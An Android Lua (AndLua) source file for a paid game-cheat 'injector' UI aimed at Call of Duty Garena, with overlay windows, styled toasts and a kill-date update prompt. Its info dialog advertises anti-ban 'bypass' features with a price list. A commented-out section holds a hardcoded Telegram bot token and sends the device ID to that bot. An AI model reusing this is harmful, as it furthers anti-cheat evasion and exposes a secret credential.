require "import"
import "android.app.*"
import "android.os.*"
import "android.widget.*"
import "android.view.*"
import "layout"
import "android.content.Context"
import "android.graphics.Typeface"
import "android.graphics.drawable.ColorDrawable"
import "android.view.*"
import "android.view.animation.*"
import "com.nirenr.Color"
import "android.graphics.Color"
import "java.net.URL"
import "java.io.BufferedReader"
import "java.io.InputStreamReader"
import "android.media.MediaPlayer"
import "android.graphics.PorterDuff"
import "android.graphics.PorterDuffColorFilter"
import "android.media.AudioManager"
import "android.content.Context"
import "android.net.ConnectivityManager"

import "android.provider.Settings"
import "android.content.Intent"
import "android.net.Uri"
import "android.view.*"
import "android.widget.*"
import "android.graphics.PixelFormat"
import "android.graphics.Typeface"
import "android.os.Handler"
import "android.os.Looper"

import "android.graphics.drawable.GradientDrawable"

--import "beg"




import("android.media.MediaPlayer")
import("android.content.Context")
import "android.graphics.PorterDuff"
import "android.graphics.PorterDuffColorFilter"

if music == nil then
  music = MediaPlayer()
  music.setDataSource(activity.getLuaDir().."/motherchod/Music.mp3")
  music.prepare()
  music.setLooping(true)
  music.start()
end

-- Stop music when leaving the injector interface
function onPause()
  if music ~= nil and music.isPlaying() then
    music.pause()
  end
end

-- Resume music when returning to the injector interface
function onResume()
  if music ~= nil and not music.isPlaying() then
    music.start()
  end
end

-- Stop music only when the injector is fully closed
function onDestroy()
  if isFinishing() then
    if music ~= nil then
      music.stop()
      music.release()
      music = nil
    end
  end
end


function createCyberToastBackground()
  local gd = GradientDrawable()
  gd.setShape(GradientDrawable.RECTANGLE)
  gd.setCornerRadius(12)
  gd.setColor(0x27000000)
  gd.setStroke(2, 0xFF00FFEE)
  return gd
end

cstmCyberToast = {
  FrameLayout;
  layout_width = "match_parent";
  layout_height = "wrap";
  gravity = "center_horizontal";

  {
    View;
    id = "glowView";
    layout_width = "wrap";
    layout_height = "fill";
    backgroundColor = 0x1100FFEE;
    layout_margin = "-5dp";
    visibility = View.INVISIBLE;
  };

  {
    LinearLayout;
    layout_width = "wrap";
    layout_height = "wrap";
    orientation = "vertical";
    gravity = "center";
    padding = "15dp";
    background = createCyberToastBackground();
    elevation = "8dp";
    layout_gravity = "center_horizontal";

    {
      LinearLayout;
      layout_width = "fill";
      layout_height = "wrap";
      orientation = "horizontal";
      gravity = "center";
      layout_marginBottom = "8dp";

      {
        TextView;
        id = "verdantHeader";
        text = " XONE BYTEX";
        textColor = 0xFF00FFEE;
        textSize = "16sp";
        typeface = Typeface.BOLD;
      };
    };

    {
      LinearLayout;
      layout_width = "wrap";
      layout_height = "wrap";
      orientation = "horizontal";
      gravity = "center_vertical";

      {
        ImageView;
        id = "icon";
        layout_width = "24dp";
        layout_height = "24dp";
        layout_marginRight = "8dp";
        src = "icon.png";
        colorFilter = 0xFF00FFEE;
      };

      {
        TextView;
        id = "toastText";
        text = "";
        textColor = 0xFFFFFFFF;
        textSize = "13sp";
        maxLines = 3;
      };
    };
  };
}

function showCyberpunkToast(message, iconPath)
  local view = loadlayout(cstmCyberToast)

  local fontPath = activity.getLuaDir() .. "/tae.ttf"
  if File(fontPath).exists() then
    local customFont = Typeface.createFromFile(File(fontPath))
    toastText.setTypeface(customFont)
    verdantHeader.setTypeface(customFont)
  end

  if iconPath and iconPath ~= "" then
    icon.setImageDrawable(Drawable.createFromPath(iconPath))
    icon.setVisibility(View.VISIBLE)
   else
    icon.setVisibility(View.GONE)
  end

  local toast = Toast.makeText(activity, "", Toast.LENGTH_LONG)
  toast.setGravity(Gravity.TOP | Gravity.CENTER_HORIZONTAL, 0, 100)

  local handler = Handler()

  local slideAnim = TranslateAnimation(0, 0, -100, 0)
  slideAnim.setDuration(400)

  local scaleAnim = ScaleAnimation(0.8, 1.0, 0.8, 1.0, Animation.RELATIVE_TO_SELF, 0.5, Animation.RELATIVE_TO_SELF, 0.5)
  scaleAnim.setDuration(400)

  local fadeAnim = AlphaAnimation(0.0, 1.0)
  fadeAnim.setDuration(400)

  local animSet = AnimationSet(true)
  animSet.addAnimation(slideAnim)
  animSet.addAnimation(scaleAnim)
  animSet.addAnimation(fadeAnim)
  view.startAnimation(animSet)

  local function pulseGlow()
    local glowAnim = AlphaAnimation(0.1, 0.3)
    glowAnim.setDuration(800)
    glowAnim.setRepeatMode(Animation.REVERSE)
    glowAnim.setRepeatCount(Animation.INFINITE)
    glowView.setVisibility(View.VISIBLE)
    glowView.startAnimation(glowAnim)
  end

  handler.postDelayed(pulseGlow, 200)

  local fullMessage = message or "No message"
  local currentText = ""
  local charIndex = 1
  local typingSpeed = 50

  local function typeNextCharacter()
    if charIndex <= #fullMessage then
      currentText = currentText .. fullMessage:sub(charIndex, charIndex)
      toastText.setText(currentText)
      charIndex = charIndex + 1
      if charIndex <= #fullMessage then
        toastText.setText(currentText .. "█")
        handler.postDelayed(typeNextCharacter, typingSpeed)
       else
        toastText.setText(currentText)
        blinkCursor()
      end
    end
  end

  local cursorVisible = true
  local blinkCount = 0
  local function blinkCursor()
    if cursorVisible then
      toastText.setText(fullMessage .. "█")
     else
      toastText.setText(fullMessage)
    end
    cursorVisible = not cursorVisible
    blinkCount = blinkCount + 1
    if blinkCount < 6 then
      handler.postDelayed(blinkCursor, 300)
     else
      toastText.setText(fullMessage)
    end
  end

  handler.postDelayed(typeNextCharacter, 500)

  local headerR, headerG, headerB = 0, 255, 238
  local headerStep = 5

  local function updateHeaderGlow()
    if headerR == 255 and headerG < 255 and headerB == 0 then
      headerG = headerG + headerStep
     elseif headerG == 255 and headerR > 0 and headerB == 0 then
      headerR = headerR - headerStep
     elseif headerG == 255 and headerB < 255 and headerR == 0 then
      headerB = headerB + headerStep
     elseif headerB == 255 and headerG > 0 and headerR == 0 then
      headerG = headerG - headerStep
     elseif headerB == 255 and headerR < 255 and headerG == 0 then
      headerR = headerR + headerStep
     elseif headerR == 255 and headerB > 0 and headerG == 0 then
      headerB = headerB - headerStep
    end

    local headerColor = 0xFF000000 | (headerR << 16) | (headerG << 8) | headerB
    verdantHeader.setTextColor(headerColor)
    verdantHeader.setShadowLayer(10, 0, 0, headerColor)
    handler.postDelayed(updateHeaderGlow, 50)
  end

  handler.postDelayed(updateHeaderGlow, 300)

  local totalDuration = 3000 + (#fullMessage * typingSpeed)
  toast.setDuration(totalDuration)

  handler.postDelayed(function()
    local glowFadeOut = AlphaAnimation(0.3, 0.0)
    glowFadeOut.setDuration(300)
    glowFadeOut.setFillAfter(true)
    glowView.startAnimation(glowFadeOut)

    local exitSlide = TranslateAnimation(0, 0, 0, -100)
    exitSlide.setDuration(400)

    local exitFade = AlphaAnimation(1.0, 0.0)
    exitFade.setDuration(400)

    local exitSet = AnimationSet(true)
    exitSet.addAnimation(exitSlide)
    exitSet.addAnimation(exitFade)
    view.startAnimation(exitSet)
  end, totalDuration - 400)

  toast.setView(view)
  toast.show()
end



import "android.provider.Settings"
import "android.content.Intent"
import "android.net.Uri"
import "android.view.*"
import "android.widget.*"
import "android.graphics.*"
import "android.os.*"

local fontPath = activity.getLuaDir() .. "/sans.ttf"
local customFont = Typeface.createFromFile(fontPath) or Typeface.DEFAULT_BOLD

local startTime = os.time()
local isRunning = true
local handler = Handler(Looper.getMainLooper())
local updateRunnable = nil
local wm, overlayView
local timeTextView, playTimeTextView

function showFloatingInfo()
  if not Settings.canDrawOverlays(activity) then
    local intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
    intent.setData(Uri.parse("package:" .. activity.getPackageName()))
    activity.startActivity(intent)
    return
  end

  wm = activity.getSystemService(Context.WINDOW_SERVICE)
  params = WindowManager.LayoutParams()
  params.width = WindowManager.LayoutParams.WRAP_CONTENT
  params.height = WindowManager.LayoutParams.WRAP_CONTENT

  params.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
  | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
  | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN

  params.format = PixelFormat.TRANSLUCENT
  params.type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
  params.gravity = Gravity.BOTTOM | Gravity.LEFT
  params.x = 0
  params.y = 0

  overlayView = LinearLayout(activity)
  overlayView.setOrientation(1)
  overlayView.setGravity(Gravity.LEFT)
  overlayView.setPadding(10, 5, 10, 5)
  overlayView.setBackgroundColor(0x00000000)

  function addText(text, size, bold, color)
    local tv = TextView(activity)
    tv.setText(text)
    tv.setTextColor(color or 0xFFFFFFFF)
    tv.setTextSize(size)
    tv.setTypeface(customFont)
    if bold then tv.setTypeface(customFont, Typeface.BOLD) end
    overlayView.addView(tv)
    return tv
  end

  addText("CALL OF DUTY GARENA", 10, true, 0xFFFF4444)
  addText("SUBSCRIPTION: FREE", 10, true, 0xFFFFFF00)
  addText("DATE: "..os.date("%B %d, %Y"), 10, false, 0xFFFFFFFF)
  timeTextView = addText("TIME: "..os.date("%I:%M %p"), 12, false, 0xFFFFFFFF)
  playTimeTextView = addText("PLAY TIME: 00:00:00", 10, false, 0xFFFFFFFF)
  addText("DEVELOPER: XENO INJ", 10, false, 0xFF888888)

  wm.addView(overlayView, params)

  updateRunnable = Runnable{
    run = function()
      if not isRunning then return end
      timeTextView.setText("TIME: "..os.date("%I:%M %p"))
      local elapsed = os.time() - startTime
      local h = math.floor(elapsed / 3600)
      local m = math.floor((elapsed % 3600) / 60)
      local s = elapsed % 60
      playTimeTextView.setText("PLAY TIME: "..string.format("%02d:%02d:%02d", h, m, s))
      handler.postDelayed(updateRunnable, 1000)
    end
  }

  handler.post(updateRunnable)
end

function removeFloatingInfo()
  isRunning = false
  if handler and updateRunnable then
    handler.removeCallbacks(updateRunnable)
  end
  if wm and overlayView then
    wm.removeView(overlayView)
    overlayView = nil
  end
  timeTextView = nil
  playTimeTextView = nil
end




--[[

function iconf.OnTouchListener(v, event)
  if event.getAction()==MotionEvent.ACTION_DOWN then
    firstXMini=event.getRawX()
    firstYMini=event.getRawY()
    wmXMini=A3params1.x
    wmYMini=A3params1.y
    isMiniDragging = false
    downTime = event.getEventTime()
   elseif event.getAction()==MotionEvent.ACTION_MOVE then
    local dx = math.abs(event.getRawX() - firstXMini)
    local dy = math.abs(event.getRawY() - firstYMini)
    if dx > 10 or dy > 10 then
      isMiniDragging = true
      A3params1.x=wmXMini+(event.getRawX()-firstXMini)
      A3params1.y=wmYMini+(event.getRawY()-firstYMini)
      LayoutVIP1.updateViewLayout(minWindow, A3params1)
      return true
    end
   elseif event.getAction()==MotionEvent.ACTION_UP then
    if isMiniDragging then
      return true
     else
      return false
    end
  end
  return false
end

]]





Date = "2027/02/23"
date = os.date("%Y/%m/%d")
if date >= Date then
  AlertDialog.Builder(this)
  .setCancelable(false)
  .setMessage("   Update to New Version!")
  .setPositiveButton("click me",{onClick=function(v)
      url = "https://t.me/Alex_Modzz"
      activity.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
      os.exit() end})
  .show()
  return
end








activity.setTheme(R.AndLua1)
activity.ActionBar.setTitle("Lets play!")
activity.ActionBar.hide()
activity.overridePendingTransition(android.R.anim.fade_in,android.R.anim.fade_out)
activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(0xFF202125);
--activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
activity.ActionBar.setElevation(0)
activity.ActionBar.setBackgroundDrawable(ColorDrawable(0xFF202125))
activity.setRequestedOrientation(1)
activity.setContentView(loadlayout(layout))



--[[


require "import"
import "android.app.*"
import "android.os.*"
import "android.widget.*"
import "android.view.*"
import "android.graphics.drawable.GradientDrawable"
import "android.provider.Settings"
import "android.content.*"
import "android.graphics.Typeface"
import "android.net.Uri"
import "android.content.ClipData"
import "android.view.animation.*"

import "java.net.URL"
import "java.io.BufferedReader"
import "java.io.InputStreamReader"

prefs = activity.getSharedPreferences("loginprefs", Context.MODE_PRIVATE)

BOT_TOKEN = "7968353948:AAFn4BbE9umfNFYe0PCaaO6vVZrqx1Ov6Hw"
CHAT_ID = "7058453451"

----------------------------------------------------
-- TELEGRAM SEND FUNCTION
----------------------------------------------------
function sendToBot(message)
  thread(function()
    local url =
      "https://api.telegram.org/bot"..BOT_TOKEN..
      "/sendMessage?chat_id="..CHAT_ID..
      "&text="..Uri.encode(message)

    local connection = URL(url):openConnection()
    connection:setRequestMethod("POST")
    connection:setDoOutput(true)

    local input = BufferedReader(InputStreamReader(connection:getInputStream()))
    local line
    local result = ""

    while true do
      line = input:readLine()
      if line == nil then break end
      result = result .. line
    end
    input:close()
    print("BOT RESPONSE:", result)
  end)
end

----------------------------------------------------
-- UTILITIES
----------------------------------------------------
function getDeviceID()
  return Settings.Secure.getString(activity.getContentResolver(), Settings.Secure.ANDROID_ID)
end

function copyToClipboard(text)
  local clip = ClipData.newPlainText("Device ID", text)
  activity.getSystemService(Context.CLIPBOARD_SERVICE).setPrimaryClip(clip)
  Toast.makeText(activity, "Copied!", Toast.LENGTH_SHORT).show()
end

function buttonClickAnim(view)
  local anim = AlphaAnimation(0.3,1.0)
  anim.setDuration(150)
  view.startAnimation(anim)
end

function StyleButton(btn, colorStart, colorEnd)
  btn.setTextColor(0xFFFFFFFF)
  btn.setAllCaps(false)
  btn.setTextSize(16)
  btn.setTypeface(nil, Typeface.BOLD)
  local bg = GradientDrawable()
  bg.setCornerRadius(30)
  bg.setColors({colorStart,colorEnd})
  bg.setStroke(3,0xFF00FF00)
  btn.setBackground(bg)
  btn.setPadding(25,20,25,20)
end

----------------------------------------------------
-- FEEDBACK DIALOG (ANY USER)
----------------------------------------------------
function showFeedbackDialog()
  local layout = LinearLayout(activity)
  layout.setOrientation(1)
  layout.setPadding(40,40,40,40)
  local bgDialog = GradientDrawable()
  bgDialog.setCornerRadius(25)
  bgDialog.setColor(0xFF101010)
  layout.setBackground(bgDialog)

  local title = TextView(activity)
  title.setText("📬 Send Feedback")
  title.setTextColor(0xFF00FFAA)
  title.setTextSize(20)
  title.setTypeface(nil, Typeface.BOLD)
  title.setGravity(Gravity.CENTER)
  title.setPadding(0,0,0,20)
  layout.addView(title)

  local input = EditText(activity)
  input.setHint("Type your feedback here…")
  input.setTextColor(0xFFFFFFFF)
  input.setHintTextColor(0xFF44AA44)
  local inputBg = GradientDrawable()
  inputBg.setColor(0xFF202020)
  inputBg.setCornerRadius(15)
  inputBg.setStroke(2, 0xFF00FF00)
  input.setBackground(inputBg)
  input.setPadding(25,20,25,20)
  layout.addView(input)

  local sendBtn = Button(activity)
  sendBtn.setText("SEND")
  StyleButton(sendBtn, 0xFF004400, 0xFF00AA00)
  layout.addView(sendBtn)

  local cancelBtn = Button(activity)
  cancelBtn.setText("CANCEL")
  StyleButton(cancelBtn, 0xFF440000, 0xFFAA0000)
  layout.addView(cancelBtn)

  local dialog = AlertDialog.Builder(activity).setView(layout).create()
  dialog.show()

  sendBtn.setOnClickListener(View.OnClickListener{
    onClick=function()
      local msg = input.getText().toString()
      if msg == "" then msg = "No message written." end
      sendToBot("Feedback from user:\n"..msg.."\nDevice: "..getDeviceID().."\nTime: "..os.date())
      dialog.dismiss()
      Toast.makeText(activity,"Feedback sent!",Toast.LENGTH_SHORT).show()
    end
  })

  cancelBtn.setOnClickListener(View.OnClickListener{
    onClick=function()
      dialog.dismiss()
    end
  })
end

----------------------------------------------------
-- LOGIN PANEL (STYLISH UI)
----------------------------------------------------
function showLoginPanel()
  local deviceID = getDeviceID()

  local layout = LinearLayout(activity)
  layout.setOrientation(1)
  layout.setPadding(40,30,40,30)
  layout.setGravity(Gravity.CENTER_HORIZONTAL)

  local bgPanel = GradientDrawable()
  bgPanel.setColor(0xFF121212)
  bgPanel.setCornerRadius(25)
  bgPanel.setStroke(4, 0xFF00FF00)
  layout.setBackground(bgPanel)

  local function makeButton(text)
    local btn = Button(activity)
    btn.setText(text)
    return btn
  end

  local title = TextView(activity)
  title.setText("💎 Yourname LOGIN SYSTEM")
  title.setTextColor(0xFF00FFAA)
  title.setTextSize(22)
  title.setTypeface(nil, Typeface.BOLD)
  title.setPadding(0,0,0,20)
  title.setGravity(Gravity.CENTER)
  layout.addView(title)

  local tv = TextView(activity)
  tv.setText("Device ID:\n"..deviceID)
  tv.setTextColor(0xFFFFFFFF)
  tv.setTextSize(16)
  tv.setPadding(0,0,0,20)
  layout.addView(tv)

  -- Buttons
  local copyBtn = makeButton("COPY DEVICE ID")
  StyleButton(copyBtn, 0xFF003300, 0xFF00AA00)
  layout.addView(copyBtn)

  local tgBtn = makeButton("SEND ID TO ADMIN")
  StyleButton(tgBtn, 0xFF005500, 0xFF00FF00)
  layout.addView(tgBtn)

  local feedbackBtn = makeButton("SEND FEEDBACK")
  StyleButton(feedbackBtn, 0xFF004477, 0xFF00AAFF)
  layout.addView(feedbackBtn)

  local exitBtn = makeButton("EXIT LOGIN SYSTEM")
  StyleButton(exitBtn, 0xFF440000, 0xFFAA0000)
  layout.addView(exitBtn)

  local dialog = AlertDialog.Builder(activity)
    .setView(layout)
    .setCancelable(false)
    .create()
  dialog.show()

  copyBtn.setOnClickListener(View.OnClickListener{
    onClick=function()
      buttonClickAnim(copyBtn)
      copyToClipboard(deviceID)
    end
  })

  tgBtn.setOnClickListener(View.OnClickListener{
    onClick=function()
      buttonClickAnim(tgBtn)
      sendToBot("DEVICE ID:\n"..deviceID)
    end
  })

  feedbackBtn.setOnClickListener(View.OnClickListener{
    onClick=function()
      buttonClickAnim(feedbackBtn)
      showFeedbackDialog()
    end
  })

  exitBtn.setOnClickListener(View.OnClickListener{
    onClick=function()
      buttonClickAnim(exitBtn)
      activity.finish()
    end
  })
end

showLoginPanel()
]]



function Waterdropanimation(Controls,time)
  import "android.animation.ObjectAnimator"
  ObjectAnimator().ofFloat(Controls,"scaleX",{1,.8,1.3,.9,1}).setDuration(time).start()
  ObjectAnimator().ofFloat(Controls,"scaleY",{1,.8,1.3,.9,1}).setDuration(time).start()
end

function CircleButton2(view,InsideColor,radiu,InsideColor1)
  import "android.graphics.drawable.GradientDrawable"
  drawable = GradientDrawable()
  drawable.setShape(GradientDrawable.RECTANGLE)
  drawable.setCornerRadii({radiu, radii, radii, radiu, radiu, radiu, radiu, radiu})
  drawable.setColor(InsideColor)
  drawable.setStroke(4, InsideColor1)
  view.setBackgroundDrawable(drawable)
end
--[[
function CircleButton(view,InsideColor,radiu,InsideColor1)
  import "android.graphics.drawable.GradientDrawable"
  drawable = GradientDrawable()
  drawable.setShape(GradientDrawable.RECTANGLE)
  drawable.setCornerRadii({radiu, radiu, radiu, radiu, radiu, radiu, radiu, radiu})
  drawable.setColor(InsideColor)
  drawable.setStroke(5, InsideColor1)
  view.setBackgroundDrawable(drawable)
end

function LinearBg(view, insideColor, radius, strokeColor, strokeWidth)
  import "android.graphics.drawable.GradientDrawable"
  local drawable = GradientDrawable()
  drawable.setShape(GradientDrawable.RECTANGLE)
  drawable.setCornerRadii({radius, radius, radius, radius, radius, radius, radius, radius})
  drawable.setColor(insideColor)
  drawable.setStroke(strokeWidth or 2, strokeColor or 0xFF000000)
  view.setBackgroundDrawable(drawable)
end


function SeekBarBg(sb, progressColor, trackColor, radius, strokeColor, strokeWidth)
  import "android.graphics.drawable.GradientDrawable"
  import "android.content.res.ColorStateList"
  local trackDrawable = GradientDrawable()
  trackDrawable.setShape(GradientDrawable.RECTANGLE)
  trackDrawable.setCornerRadii({radius,radius,radius,radius,radius,radius,radius,radius})
  trackDrawable.setColor(trackColor or 0x00000000)
  trackDrawable.setStroke(strokeWidth or 3, strokeColor or 0xFF000000)
  sb.setProgressDrawable(trackDrawable)
  local thumbDrawable = GradientDrawable()
  thumbDrawable.setShape(GradientDrawable.OVAL)
  thumbDrawable.setColor(progressColor or 0xFFFFFFFF)
  thumbDrawable.setSize(30,30)
  sb.setThumb(thumbDrawable)
end

]]



function CircleButton(view,InsideColor,radiu,InsideColor1)
  import "android.graphics.drawable.GradientDrawable"
  drawable = GradientDrawable()
  drawable.setShape(GradientDrawable.RECTANGLE)
  drawable.setCornerRadii({radiu, radiu, radiu, radiu, radiu, radiu, radiu, radiu})
  drawable.setColor(InsideColor)
  drawable.setStroke(5, InsideColor1)
  view.setBackgroundDrawable(drawable)
end


function LinearBg(view, insideColor, radius, strokeColor, strokeWidth)
  import "android.graphics.drawable.GradientDrawable"
  local drawable = GradientDrawable()
  drawable.setShape(GradientDrawable.RECTANGLE)
  drawable.setCornerRadii({radius, radius, radius, radius, radius, radius, radius, radius})
  drawable.setColor(insideColor)
  drawable.setStroke(strokeWidth or 2, strokeColor or 0xFF000000)
  view.setBackgroundDrawable(drawable)
end


function TextViewBg(tv, insideColor, radius, strokeColor, strokeWidth)
  import "android.graphics.drawable.GradientDrawable"
  local drawable = GradientDrawable()
  drawable.setShape(GradientDrawable.RECTANGLE)
  drawable.setCornerRadii({radius, radius, radius, radius, radius, radius, radius, radius})
  drawable.setColor(insideColor or 0xFFFFFFFF)
  drawable.setStroke(strokeWidth or 2, strokeColor or 0xFF000000)
  tv.setBackgroundDrawable(drawable)
end




function SwitchBg(sw, thumbColor, trackColor, radius, strokeColor, strokeWidth)
  import "android.graphics.drawable.GradientDrawable"
  import "android.content.res.ColorStateList"
  local trackDrawable = GradientDrawable()
  trackDrawable.setShape(GradientDrawable.RECTANGLE)
  trackDrawable.setCornerRadii({radius, radius, radius, radius, radius, radius, radius, radius})
  trackDrawable.setColor(trackColor or 0xFFCCCCCC)
  trackDrawable.setStroke(strokeWidth or 6, strokeColor or 0xFF000000)

  sw.setTrackDrawable(trackDrawable)
  sw.setThumbTintList(ColorStateList.valueOf(thumbColor or 0xFFFFFFFF))
end


function SeekBarBg(sb, progressColor, trackColor, radius, strokeColor, strokeWidth)
  import "android.graphics.drawable.GradientDrawable"
  import "android.content.res.ColorStateList"
  local trackDrawable = GradientDrawable()
  trackDrawable.setShape(GradientDrawable.RECTANGLE)
  trackDrawable.setCornerRadii({radius,radius,radius,radius,radius,radius,radius,radius})
  trackDrawable.setColor(trackColor or 0xFF888888)
  trackDrawable.setStroke(strokeWidth or 3, strokeColor or 0xFF000000)
  sb.setProgressDrawable(trackDrawable)
  local thumbDrawable = GradientDrawable()
  thumbDrawable.setShape(GradientDrawable.OVAL)
  thumbDrawable.setColor(progressColor or 0xFFFFFFFF)
  thumbDrawable.setSize(30,30)
  sb.setThumb(thumbDrawable)
end


function CardBg(cardView, bgColor, radius, strokeColor, strokeWidth)
  import "android.graphics.drawable.GradientDrawable"
  local drawable = GradientDrawable()
  drawable.setShape(GradientDrawable.RECTANGLE)
  drawable.setCornerRadii({radius, radius, radius, radius, radius, radius, radius, radius})
  drawable.setColor(bgColor or 0xFFFFFFFF)
  drawable.setStroke(strokeWidth or 2, strokeColor or 0xFF000000)
  cardView.setBackgroundDrawable(drawable)
  cardView.setClipToOutline(true)
end



--[[

function CircleButton2(view,InsideColor,radiu,InsideColor1)
  import "android.graphics.drawable.GradientDrawable"
  drawable = GradientDrawable()
  drawable.setShape(GradientDrawable.RECTANGLE)
  drawable.setCornerRadii({radiu, radiu, radiu, radiu, radiu, radiu, radiu, radiu})
  drawable.setColor(InsideColor)
  drawable.setStroke(5, InsideColor1)
  view.setBackgroundDrawable(drawable)
end

]]




import "java.io.File"
import "android.graphics.Typeface"
local bf=File(activity.getLuaDir().."/font/zt2.ttf");
local tf=Typeface.createFromFile(bf)

strt.setTypeface(tf);
stp.setTypeface(tf);
strttxt.getPaint().setFakeBoldText(true)
stptxt.getPaint().setFakeBoldText(true)






import "example"
LayoutVIP=activity.getSystemService(Context.WINDOW_SERVICE)
HasFocus=false
A3params =WindowManager.LayoutParams()
if Build.VERSION.SDK_INT >= 26 then A3params.type =WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
 else A3params.type =WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
end
import "android.graphics.PixelFormat"
A3params.format =PixelFormat.RGBA_8888
A3params.x = 0
A3params.y = 0
A3params.flags=WindowManager.LayoutParams().FLAG_NOT_FOCUSABLE
A3params.gravity = Gravity.CENTER | Gravity.CENTER
A3params.width = WindowManager.LayoutParams.WRAP_CONTENT
A3params.height = WindowManager.LayoutParams.WRAP_CONTENT
mainWindow = loadlayout(example)
isMax=false


import "icon"


LayoutVIP1=activity.getSystemService(Context.WINDOW_SERVICE)
HasFocus=false
A3params1 =WindowManager.LayoutParams()
if Build.VERSION.SDK_INT >= 26 then A3params1.type =WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
 else A3params1.type =WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
end
import "android.graphics.PixelFormat"
A3params1.format =PixelFormat.RGBA_8888
A3params1.x = 0
A3params1.y = 100
A3params1.flags=WindowManager.LayoutParams().FLAG_NOT_FOCUSABLE
A3params1.gravity = Gravity.CENTER | Gravity.CENTER
A3params1.width = WindowManager.LayoutParams.WRAP_CONTENT
A3params1.height = WindowManager.LayoutParams.WRAP_CONTENT
minWindow = loadlayout(icon)
OpenM=false
----


function Win_minWindow.OnTouchListener(v,event)
  if OpenM==false then
    if event.getAction()==MotionEvent.ACTION_DOWN then
      firstX=event.getRawX()
      firstY=event.getRawY()
      wmX=A3params1.x
      wmY=A3params1.y
     elseif event.getAction()==MotionEvent.ACTION_MOVE then
      A3params1.x=wmX+(event.getRawX()-firstX)
      A3params1.y=wmY+(event.getRawY()-firstY)
      LayoutVIP1.updateViewLayout(minWindow,A3params1)
     elseif event.getAction()==MotionEvent.ACTION_UP then
     else
    end
  end return false end


function fl.OnTouchListener(v,event)
  if event.getAction()==MotionEvent.ACTION_DOWN then
    firstX=event.getRawX()
    firstY=event.getRawY()
    wmX=A3params.x
    wmY=A3params.y
   elseif event.getAction()==MotionEvent.ACTION_MOVE then
    A3params.x=wmX+(event.getRawX()-firstX)
    A3params.y=wmY+(event.getRawY()-firstY)
    LayoutVIP.updateViewLayout(mainWindow,A3params)
   elseif event.getAction()==MotionEvent.ACTION_UP then
  end
  return
  true
end



function Win_minWindow.onClick(v)
  Waterdropanimation(Win_minWindow,50)
  if OpenM==false then
    OpenM=true
    LayoutVIP.addView(mainWindow,A3params)
    LayoutVIP1.removeView(minWindow)
  end
end

function t1.onClick(v)
  if OpenM==true then
    OpenM=false
    LayoutVIP.removeView(mainWindow)
    LayoutVIP1.addView(minWindow,A3params1)
    t1.startAnimation(Alpha)
  end
end

function t1.onLongClick(v)
  if isMax==true && OpenM==true then
    isMax=false OpenM=false
    LayoutVIP.removeView(mainWindow)
    smooth.setChecked(false)
  end
end

function hidebtn.onClick(v)
  if OpenM==true then
    OpenM=false
    LayoutVIP.removeView(mainWindow)
    LayoutVIP1.addView(minWindow,A3params1)
    t1.startAnimation(Alpha)
  end
end

function hidebtn.onLongClick(v)
  if isMax==true && OpenM==true then
    isMax=false OpenM=false
    LayoutVIP.removeView(mainWindow)
    smooth.setChecked(false)
  end
end

hidebtn.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF16FFFF, PorterDuff.Mode.SRC_ATOP))



import "android.view.View"

function enableImmersiveMode()
  local decorView = activity.getWindow().getDecorView()
  decorView.setSystemUiVisibility(
  View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
  View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
  View.SYSTEM_UI_FLAG_FULLSCREEN
  )
end

enableImmersiveMode()

function start.onClick()
  Waterdropanimation(start,20)
  if isMax==false then
    isMax=true
    LayoutVIP1.addView(minWindow,A3params1)

  end
end

function stop.onClick()
  os.exit()
end
--[[
function exit.onClick()
  os.exit()
end
]]
info.setTypeface(Typeface.createFromFile(activity.getLuaDir("assets/files/jakol.ttf")))


function info.onClick()
  Waterdropanimation(getkey,100)
  dialog=AlertDialog.Builder(this)
  .setTitle("WHATS NEW?")
  .setCancelable(false)
  .setMessage("ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ ᴘʀᴇᴍɪᴜᴍ ᴀʟᴇx ɪɴᴊᴇᴄᴛᴏʀ\nᴄʜᴀɴɢᴇʟᴏɢ:\nʙʏᴘᴀss sᴛʀᴏɴɢ\nɴᴏ ᴀᴜᴛᴏ ʙᴀɴ\nɴᴏ ᴀᴜᴛᴏ 𝟷 ᴅᴀʏ ʙᴀɴ\nɴᴏ 𝟷𝟶ʏʀs ʙᴀɴ\nʟᴏᴄᴋ 3-7ᴅᴀʏs ʙᴀɴ\nᴘʀᴇᴍɪᴜᴍ ʜᴀs ɴᴏ sᴋɪɴ ᴀɴᴅ ᴍᴏʀᴇ sᴀғᴇ ғᴇᴀᴛᴜʀᴇs ᴀɴᴅ ᴍᴏʀᴇ ᴜᴘᴅᴀᴛᴇ ᴊᴏɪɴ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ?\n\n🔥PRICELIST🔥:\n1DAY - 50₱\n2DAY - 80₱\n3DAYS - 90₱\n7DAYS - 150₱\n15DAYS - 200₱\n20DAYS - 230₱\n30DAYS - 290₱\nLIFETIME - 300₱\n\n👉PROMO BY ALEX👈\nLIFETIME = 200 🤑🤑🤑🤑\nLIFETIME ONLY FOR PROMO\n\n\n🛡BYPASS STRONG🛡\nMANY FEATURES AND SKIN AND SAFE AND BRUTAL CHOICES. IF YOU BUY INJECTOR DM THIS ON TELEGRAM👇👇👇\nTELEGRAM OWNER:@Alex_Modzz\nJOIN MY CHANNEL:https://t.me/Alexinjector\n👆👆👆👆FOR MORE FREE INJECTOR")
  .setPositiveButton("OK",nil)
  .show()


  message=dialog.findViewById(android.R.id.message)
  message.setTextColor(0xFFFFFFFF)
  CircleButton(dialog.getWindow(),0xFF0E127E,15,0xFFFFFFFF)
  import "android.text.SpannableString"
  import "android.text.style.ForegroundColorSpan"
  import "android.text.Spannable"
  texttitle = SpannableString("WHATS NEW?")
